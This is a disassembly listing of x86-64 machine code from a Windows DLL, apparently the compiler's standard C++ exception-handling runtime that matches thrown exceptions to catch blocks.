   1800047b8:	45 3b ef             	cmp    %r15d,%r13d
   1800047bb:	74 71                	je     0x18000482e
   1800047bd:	48 8b 55 98          	mov    -0x68(%rbp),%rdx
   1800047c1:	e9 68 ff ff ff       	jmp    0x18000472e
   1800047c6:	8a 85 98 00 00 00    	mov    0x98(%rbp),%al
   1800047cc:	41 b5 01             	mov    $0x1,%r13b
   1800047cf:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   1800047d4:	4c 8b ce             	mov    %rsi,%r9
   1800047d7:	48 8b 55 80          	mov    -0x80(%rbp),%rdx
   1800047db:	48 8b cb             	mov    %rbx,%rcx
   1800047de:	88 44 24 58          	mov    %al,0x58(%rsp)
   1800047e2:	8a 44 24 61          	mov    0x61(%rsp),%al
   1800047e6:	88 44 24 50          	mov    %al,0x50(%rsp)
   1800047ea:	48 8b 45 88          	mov    -0x78(%rbp),%rax
   1800047ee:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1800047f3:	8b 85 a0 00 00 00    	mov    0xa0(%rbp),%eax
   1800047f9:	89 44 24 40          	mov    %eax,0x40(%rsp)
   1800047fd:	48 8d 45 a0          	lea    -0x60(%rbp),%rax
   180004801:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   180004806:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   18000480a:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   18000480f:	48 8d 45 f8          	lea    -0x8(%rbp),%rax
   180004813:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180004818:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   18000481d:	44 88 6c 24 60       	mov    %r13b,0x60(%rsp)
   180004822:	e8 f1 fb ff ff       	call   0x180004418
   180004827:	4c 8b 4c 24 78       	mov    0x78(%rsp),%r9
   18000482c:	eb 0a                	jmp    0x180004838
   18000482e:	4c 8b 4c 24 78       	mov    0x78(%rsp),%r9
   180004833:	44 8a 6c 24 60       	mov    0x60(%rsp),%r13b
   180004838:	41 ff c4             	inc    %r12d
   18000483b:	44 3b 65 f0          	cmp    -0x10(%rbp),%r12d
   18000483f:	0f 82 81 fe ff ff    	jb     0x1800046c6
   180004845:	45 84 ed             	test   %r13b,%r13b
   180004848:	0f 85 15 01 00 00    	jne    0x180004963
   18000484e:	4c 8b 65 80          	mov    -0x80(%rbp),%r12
   180004852:	8b 07                	mov    (%rdi),%eax
   180004854:	25 ff ff ff 1f       	and    $0x1fffffff,%eax
   180004859:	3d 21 05 93 19       	cmp    $0x19930521,%eax
   18000485e:	0f 82 ff 00 00 00    	jb     0x180004963
   180004864:	83 7f 20 00          	cmpl   $0x0,0x20(%rdi)
   180004868:	74 0e                	je     0x180004878
   18000486a:	e8 09 ee ff ff       	call   0x180003678
   18000486f:	48 63 4f 20          	movslq 0x20(%rdi),%rcx
   180004873:	48 03 c1             	add    %rcx,%rax
   180004876:	75 21                	jne    0x180004899
   180004878:	8b 47 24             	mov    0x24(%rdi),%eax
   18000487b:	c1 e8 02             	shr    $0x2,%eax
   18000487e:	a8 01                	test   $0x1,%al
   180004880:	0f 84 dd 00 00 00    	je     0x180004963
   180004886:	48 8b d7             	mov    %rdi,%rdx
   180004889:	48 8b ce             	mov    %rsi,%rcx
   18000488c:	e8 b7 e9 ff ff       	call   0x180003248
   180004891:	84 c0                	test   %al,%al
   180004893:	0f 85 ca 00 00 00    	jne    0x180004963
   180004899:	8b 47 24             	mov    0x24(%rdi),%eax
   18000489c:	c1 e8 02             	shr    $0x2,%eax
   18000489f:	a8 01                	test   $0x1,%al
   1800048a1:	0f 85 12 01 00 00    	jne    0x1800049b9
   1800048a7:	83 7f 20 00          	cmpl   $0x0,0x20(%rdi)
   1800048ab:	74 11                	je     0x1800048be
   1800048ad:	e8 c6 ed ff ff       	call   0x180003678
   1800048b2:	48 8b d0             	mov    %rax,%rdx
   1800048b5:	48 63 47 20          	movslq 0x20(%rdi),%rax
   1800048b9:	48 03 d0             	add    %rax,%rdx
   1800048bc:	eb 02                	jmp    0x1800048c0
   1800048be:	33 d2                	xor    %edx,%edx
   1800048c0:	48 8b cb             	mov    %rbx,%rcx
   1800048c3:	e8 98 0b 00 00       	call   0x180005460
   1800048c8:	84 c0                	test   %al,%al
   1800048ca:	0f 85 93 00 00 00    	jne    0x180004963
   1800048d0:	4c 8d 4d 90          	lea    -0x70(%rbp),%r9
   1800048d4:	4c 8b c7             	mov    %rdi,%r8
   1800048d7:	48 8b d6             	mov    %rsi,%rdx
   1800048da:	49 8b cc             	mov    %r12,%rcx
   1800048dd:	e8 f6 e9 ff ff       	call   0x1800032d8
   1800048e2:	8a 8d 98 00 00 00    	mov    0x98(%rbp),%cl
   1800048e8:	4c 8b c8             	mov    %rax,%r9
   1800048eb:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   1800048f0:	48 8b d3             	mov    %rbx,%rdx
   1800048f3:	88 4c 24 50          	mov    %cl,0x50(%rsp)
   1800048f7:	83 c9 ff             	or     $0xffffffff,%ecx
   1800048fa:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   1800048ff:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   180004905:	89 4c 24 38          	mov    %ecx,0x38(%rsp)
   180004909:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   18000490d:	49 8b cc             	mov    %r12,%rcx
   180004910:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   180004915:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   18000491b:	e8 c4 eb ff ff       	call   0x1800034e4
   180004920:	eb 41                	jmp    0x180004963
   180004922:	83 7f 0c 00          	cmpl   $0x0,0xc(%rdi)
   180004926:	76 3b                	jbe    0x180004963
   180004928:	44 38 ad 98 00 00 00 	cmp    %r13b,0x98(%rbp)
   18000492f:	0f 85 a1 00 00 00    	jne    0x1800049d6
   180004935:	48 8b 45 88          	mov    -0x78(%rbp),%rax
   180004939:	4c 8b ce             	mov    %rsi,%r9
   18000493c:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   180004941:	4d 8b c7             	mov    %r15,%r8
   180004944:	8b 85 a0 00 00 00    	mov    0xa0(%rbp),%eax
   18000494a:	49 8b d4             	mov    %r12,%rdx
   18000494d:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180004951:	48 8b cb             	mov    %rbx,%rcx
   180004954:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   180004959:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   18000495e:	e8 79 00 00 00       	call   0x1800049dc
   180004963:	e8 9c f5 ff ff       	call   0x180003f04
   180004968:	48 83 78 38 00       	cmpq   $0x0,0x38(%rax)
   18000496d:	75 67                	jne    0x1800049d6
   18000496f:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   180004973:	48 33 cc             	xor    %rsp,%rcx
   180004976:	e8 65 d9 ff ff       	call   0x1800022e0
   18000497b:	48 81 c4 28 01 00 00 	add    $0x128,%rsp
   180004982:	41 5f                	pop    %r15
   180004984:	41 5e                	pop    %r14
   180004986:	41 5d                	pop    %r13
   180004988:	41 5c                	pop    %r12
   18000498a:	5f                   	pop    %rdi
   18000498b:	5e                   	pop    %rsi
   18000498c:	5b                   	pop    %rbx
   18000498d:	5d                   	pop    %rbp
   18000498e:	c3                   	ret
   18000498f:	b2 01                	mov    $0x1,%dl
   180004991:	48 8b cb             	mov    %rbx,%rcx
   180004994:	e8 77 ee ff ff       	call   0x180003810
   180004999:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
   18000499d:	e8 06 06 00 00       	call   0x180004fa8
   1800049a2:	48 8d 15 df d8 01 00 	lea    0x1d8df(%rip),%rdx        # 0x180022288
   1800049a9:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
   1800049ad:	e8 9a ef ff ff       	call   0x18000394c
   1800049b2:	cc                   	int3
   1800049b3:	e8 10 74 00 00       	call   0x18000bdc8
   1800049b8:	cc                   	int3
   1800049b9:	e8 46 f5 ff ff       	call   0x180003f04
   1800049be:	48 89 58 20          	mov    %rbx,0x20(%rax)
   1800049c2:	e8 3d f5 ff ff       	call   0x180003f04
   1800049c7:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   1800049cc:	48 89 48 28          	mov    %rcx,0x28(%rax)
   1800049d0:	e8 f3 73 00 00       	call   0x18000bdc8
   1800049d5:	cc                   	int3
   1800049d6:	e8 19 74 00 00       	call   0x18000bdf4
   1800049db:	cc                   	int3
   1800049dc:	48 8b c4             	mov    %rsp,%rax
   1800049df:	48 89 58 20          	mov    %rbx,0x20(%rax)
   1800049e3:	4c 89 40 18          	mov    %r8,0x18(%rax)
   1800049e7:	48 89 50 10          	mov    %rdx,0x10(%rax)
   1800049eb:	55                   	push   %rbp
   1800049ec:	56                   	push   %rsi
   1800049ed:	57                   	push   %rdi
   1800049ee:	41 54                	push   %r12
   1800049f0:	41 55                	push   %r13
   1800049f2:	41 56                	push   %r14
   1800049f4:	41 57                	push   %r15
   1800049f6:	48 8d 68 c1          	lea    -0x3f(%rax),%rbp
   1800049fa:	48 81 ec c0 00 00 00 	sub    $0xc0,%rsp
   180004a01:	81 39 03 00 00 80    	cmpl   $0x80000003,(%rcx)
   180004a07:	49 8b f1             	mov    %r9,%rsi
   180004a0a:	4d 8b f8             	mov    %r8,%r15
   180004a0d:	4c 8b f1             	mov    %rcx,%r14
   180004a10:	74 6e                	je     0x180004a80
   180004a12:	e8 ed f4 ff ff       	call   0x180003f04
   180004a17:	44 8b 65 6f          	mov    0x6f(%rbp),%r12d
   180004a1b:	48 8b 7d 67          	mov    0x67(%rbp),%rdi
   180004a1f:	48 83 78 10 00       	cmpq   $0x0,0x10(%rax)
   180004a24:	74 75                	je     0x180004a9b
   180004a26:	33 c9                	xor    %ecx,%ecx
   180004a28:	ff 15 ea 36 01 00    	call   *0x136ea(%rip)        # 0x180018118
   180004a2e:	48 8b d8             	mov    %rax,%rbx
   180004a31:	e8 ce f4 ff ff       	call   0x180003f04
   180004a36:	48 39 58 10          	cmp    %rbx,0x10(%rax)
   180004a3a:	74 5f                	je     0x180004a9b
   180004a3c:	41 81 3e 4d 4f 43 e0 	cmpl   $0xe0434f4d,(%r14)
   180004a43:	74 56                	je     0x180004a9b
   180004a45:	41 81 3e 52 43 43 e0 	cmpl   $0xe0434352,(%r14)
   180004a4c:	44 8b 6d 77          	mov    0x77(%rbp),%r13d
   180004a50:	74 4d                	je     0x180004a9f
   180004a52:	48 8b 45 7f          	mov    0x7f(%rbp),%rax
   180004a56:	4c 8b ce             	mov    %rsi,%r9
   180004a59:	48 8b 55 4f          	mov    0x4f(%rbp),%rdx
   180004a5d:	4d 8b c7             	mov    %r15,%r8
   180004a60:	44 89 64 24 38       	mov    %r12d,0x38(%rsp)
   180004a65:	49 8b ce             	mov    %r14,%rcx
   180004a68:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180004a6d:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   180004a72:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180004a77:	e8 24 e7 ff ff       	call   0x1800031a0
   180004a7c:	85 c0                	test   %eax,%eax
   180004a7e:	74 1f                	je     0x180004a9f
   180004a80:	48 8b 9c 24 18 01 00 	mov    0x118(%rsp),%rbx
   180004a87:	00 
   180004a88:	48 81 c4 c0 00 00 00 	add    $0xc0,%rsp
   180004a8f:	41 5f                	pop    %r15
   180004a91:	41 5e                	pop    %r14
   180004a93:	41 5d                	pop    %r13
   180004a95:	41 5c                	pop    %r12
   180004a97:	5f                   	pop    %rdi
   180004a98:	5e                   	pop    %rsi
   180004a99:	5d                   	pop    %rbp
   180004a9a:	c3                   	ret
   180004a9b:	44 8b 6d 77          	mov    0x77(%rbp),%r13d
   180004a9f:	48 8b 46 08          	mov    0x8(%rsi),%rax
   180004aa3:	48 89 45 af          	mov    %rax,-0x51(%rbp)
   180004aa7:	48 89 7d a7          	mov    %rdi,-0x59(%rbp)
   180004aab:	83 7f 0c 00          	cmpl   $0x0,0xc(%rdi)
   180004aaf:	0f 86 36 01 00 00    	jbe    0x180004beb
   180004ab5:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   180004aba:	48 8d 55 a7          	lea    -0x59(%rbp),%rdx
   180004abe:	4c 8b ce             	mov    %rsi,%r9
   180004ac1:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180004ac6:	45 8b c4             	mov    %r12d,%r8d
   180004ac9:	48 8d 4d df          	lea    -0x21(%rbp),%rcx
   180004acd:	e8 d2 e8 ff ff       	call   0x1800033a4
   180004ad2:	0f 10 45 df          	movups -0x21(%rbp),%xmm0
   180004ad6:	f3 0f 7f 45 b7       	movdqu %xmm0,-0x49(%rbp)
   180004adb:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   180004ae0:	66 0f 7e c0          	movd   %xmm0,%eax
   180004ae4:	3b 45 f7             	cmp    -0x9(%rbp),%eax
   180004ae7:	73 97                	jae    0x180004a80
   180004ae9:	4c 8b 4d df          	mov    -0x21(%rbp),%r9
   180004aed:	44 8b 7d bf          	mov    -0x41(%rbp),%r15d
   180004af1:	4c 89 4d 47          	mov    %r9,0x47(%rbp)
   180004af5:	48 8b 45 b7          	mov    -0x49(%rbp),%rax
   180004af9:	48 8b 00             	mov    (%rax),%rax
   180004afc:	48 63 50 10          	movslq 0x10(%rax),%rdx
   180004b00:	41 8b c7             	mov    %r15d,%eax
   180004b03:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   180004b07:	49 8b 41 08          	mov    0x8(%r9),%rax
   180004b0b:	4c 8d 04 8a          	lea    (%rdx,%rcx,4),%r8
   180004b0f:	41 0f 10 04 00       	movups (%r8,%rax,1),%xmm0
   180004b14:	49 63 4c 00 10       	movslq 0x10(%r8,%rax,1),%rcx
   180004b19:	89 4d d7             	mov    %ecx,-0x29(%rbp)
   180004b1c:	66 0f 7e c0          	movd   %xmm0,%eax
   180004b20:	0f 11 45 c7          	movups %xmm0,-0x39(%rbp)
   180004b24:	41 3b c4             	cmp    %r12d,%eax
   180004b27:	0f 8f a4 00 00 00    	jg     0x180004bd1
   180004b2d:	48 8b 45 c7          	mov    -0x39(%rbp),%rax
   180004b31:	48 c1 e8 20          	shr    $0x20,%rax
   180004b35:	44 3b e0             	cmp    %eax,%r12d
   180004b38:	0f 8f 93 00 00 00    	jg     0x180004bd1
   180004b3e:	48 03 4e 08          	add    0x8(%rsi),%rcx
   180004b42:	48 8b 5d cf          	mov    -0x31(%rbp),%rbx
   180004b46:	48 c1 eb 20          	shr    $0x20,%rbx
   180004b4a:	48 ff cb             	dec    %rbx
   180004b4d:	48 8d 1c 9b          	lea    (%rbx,%rbx,4),%rbx
   180004b51:	48 8d 1c 99          	lea    (%rcx,%rbx,4),%rbx
   180004b55:	83 7b 04 00          	cmpl   $0x0,0x4(%rbx)
   180004b59:	74 2d                	je     0x180004b88
   180004b5b:	4c 63 6b 04          	movslq 0x4(%rbx),%r13
   180004b5f:	e8 14 eb ff ff       	call   0x180003678
   180004b64:	49 03 c5             	add    %r13,%rax
   180004b67:	74 1b                	je     0x180004b84
   180004b69:	45 85 ed             	test   %r13d,%r13d
   180004b6c:	74 0e                	je     0x180004b7c
   180004b6e:	e8 05 eb ff ff       	call   0x180003678
   180004b73:	48 63 4b 04          	movslq 0x4(%rbx),%rcx
   180004b77:	48 03 c1             	add    %rcx,%rax
   180004b7a:	eb 02                	jmp    0x180004b7e
   180004b7c:	33 c0                	xor    %eax,%eax
   180004b7e:	80 78 10 00          	cmpb   $0x0,0x10(%rax)
   180004b82:	75 4d                	jne    0x180004bd1
   180004b84:	44 8b 6d 77          	mov    0x77(%rbp),%r13d
   180004b88:	f6 03 40             	testb  $0x40,(%rbx)
   180004b8b:	75 44                	jne    0x180004bd1
   180004b8d:	48 8b 45 7f          	mov    0x7f(%rbp),%rax
   180004b91:	4c 8b ce             	mov    %rsi,%r9
   180004b94:	4c 8b 45 57          	mov    0x57(%rbp),%r8
   180004b98:	49 8b ce             	mov    %r14,%rcx
   180004b9b:	48 8b 55 4f          	mov    0x4f(%rbp),%rdx
   180004b9f:	c6 44 24 58 00       	movb   $0x0,0x58(%rsp)
   180004ba4:	c6 44 24 50 01       	movb   $0x1,0x50(%rsp)
   180004ba9:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   180004bae:	48 8d 45 c7          	lea    -0x39(%rbp),%rax
   180004bb2:	44 89 6c 24 40       	mov    %r13d,0x40(%rsp)
   180004bb7:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   180004bbc:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   180004bc2:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   180004bc7:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180004bcc:	e8 47 f8 ff ff       	call   0x180004418
   180004bd1:	44 8b 6d 77          	mov    0x77(%rbp),%r13d
   180004bd5:	41 ff c7             	inc    %r15d
   180004bd8:	4c 8b 4d 47          	mov    0x47(%rbp),%r9
   180004bdc:	44 3b 7d f7          	cmp    -0x9(%rbp),%r15d
   180004be0:	0f 82 0f ff ff ff    	jb     0x180004af5
   180004be6:	e9 95 fe ff ff       	jmp    0x180004a80
   180004beb:	e8 04 72 00 00       	call   0x18000bdf4
   180004bf0:	cc                   	int3
   180004bf1:	cc                   	int3
   180004bf2:	cc                   	int3
   180004bf3:	cc                   	int3
   180004bf4:	48 8b c4             	mov    %rsp,%rax
   180004bf7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180004bfb:	48 89 68 10          	mov    %rbp,0x10(%rax)
   180004bff:	48 89 70 18          	mov    %rsi,0x18(%rax)
   180004c03:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180004c07:	41 56                	push   %r14
   180004c09:	48 83 ec 20          	sub    $0x20,%rsp
   180004c0d:	33 db                	xor    %ebx,%ebx
   180004c0f:	4d 8b f0             	mov    %r8,%r14
   180004c12:	48 8b ea             	mov    %rdx,%rbp
   180004c15:	48 8b f9             	mov    %rcx,%rdi
   180004c18:	39 59 04             	cmp    %ebx,0x4(%rcx)
   180004c1b:	0f 84 f0 00 00 00    	je     0x180004d11
   180004c21:	48 63 71 04          	movslq 0x4(%rcx),%rsi
   180004c25:	e8 4e ea ff ff       	call   0x180003678
   180004c2a:	4c 8b c8             	mov    %rax,%r9
   180004c2d:	4c 03 ce             	add    %rsi,%r9
   180004c30:	0f 84 db 00 00 00    	je     0x180004d11
   180004c36:	85 f6                	test   %esi,%esi
   180004c38:	74 0f                	je     0x180004c49
   180004c3a:	48 63 77 04          	movslq 0x4(%rdi),%rsi
   180004c3e:	e8 35 ea ff ff       	call   0x180003678
   180004c43:	48 8d 0c 06          	lea    (%rsi,%rax,1),%rcx
   180004c47:	eb 05                	jmp    0x180004c4e
   180004c49:	48 8b cb             	mov    %rbx,%rcx
   180004c4c:	8b f3                	mov    %ebx,%esi
   180004c4e:	38 59 10             	cmp    %bl,0x10(%rcx)
   180004c51:	0f 84 ba 00 00 00    	je     0x180004d11
   180004c57:	f6 07 80             	testb  $0x80,(%rdi)
   180004c5a:	74 0a                	je     0x180004c66
   180004c5c:	f6 45 00 10          	testb  $0x10,0x0(%rbp)
   180004c60:	0f 85 ab 00 00 00    	jne    0x180004d11
   180004c66:	85 f6                	test   %esi,%esi
   180004c68:	74 11                	je     0x180004c7b
   180004c6a:	e8 09 ea ff ff       	call   0x180003678
   180004c6f:	48 8b f0             	mov    %rax,%rsi
   180004c72:	48 63 47 04          	movslq 0x4(%rdi),%rax
   180004c76:	48 03 f0             	add    %rax,%rsi
   180004c79:	eb 03                	jmp    0x180004c7e
   180004c7b:	48 8b f3             	mov    %rbx,%rsi
   180004c7e:	e8 09 ea ff ff       	call   0x18000368c
   180004c83:	48 8b c8             	mov    %rax,%rcx
   180004c86:	48 63 45 04          	movslq 0x4(%rbp),%rax
   180004c8a:	48 03 c8             	add    %rax,%rcx
   180004c8d:	48 3b f1             	cmp    %rcx,%rsi
   180004c90:	74 4b                	je     0x180004cdd
   180004c92:	39 5f 04             	cmp    %ebx,0x4(%rdi)
   180004c95:	74 11                	je     0x180004ca8
   180004c97:	e8 dc e9 ff ff       	call   0x180003678
   180004c9c:	48 8b f0             	mov    %rax,%rsi
   180004c9f:	48 63 47 04          	movslq 0x4(%rdi),%rax
   180004ca3:	48 03 f0             	add    %rax,%rsi
   180004ca6:	eb 03                	jmp    0x180004cab
   180004ca8:	48 8b f3             	mov    %rbx,%rsi
   180004cab:	e8 dc e9 ff ff       	call   0x18000368c
   180004cb0:	4c 63 45 04          	movslq 0x4(%rbp),%r8
   180004cb4:	49 83 c0 10          	add    $0x10,%r8
   180004cb8:	4c 03 c0             	add    %rax,%r8
   180004cbb:	48 8d 46 10          	lea    0x10(%rsi),%rax
   180004cbf:	4c 2b c0             	sub    %rax,%r8
   180004cc2:	0f b6 08             	movzbl (%rax),%ecx
   180004cc5:	42 0f b6 14 00       	movzbl (%rax,%r8,1),%edx
   180004cca:	2b ca                	sub    %edx,%ecx
   180004ccc:	75 07                	jne    0x180004cd5
   180004cce:	48 ff c0             	inc    %rax
   180004cd1:	85 d2                	test   %edx,%edx
   180004cd3:	75 ed                	jne    0x180004cc2
   180004cd5:	85 c9                	test   %ecx,%ecx
   180004cd7:	74 04                	je     0x180004cdd
   180004cd9:	33 c0                	xor    %eax,%eax
   180004cdb:	eb 39                	jmp    0x180004d16
   180004cdd:	b0 02                	mov    $0x2,%al
   180004cdf:	84 45 00             	test   %al,0x0(%rbp)
   180004ce2:	74 05                	je     0x180004ce9
   180004ce4:	f6 07 08             	testb  $0x8,(%rdi)
   180004ce7:	74 24                	je     0x180004d0d
   180004ce9:	41 f6 06 01          	testb  $0x1,(%r14)
   180004ced:	74 05                	je     0x180004cf4
   180004cef:	f6 07 01             	testb  $0x1,(%rdi)
   180004cf2:	74 19                	je     0x180004d0d
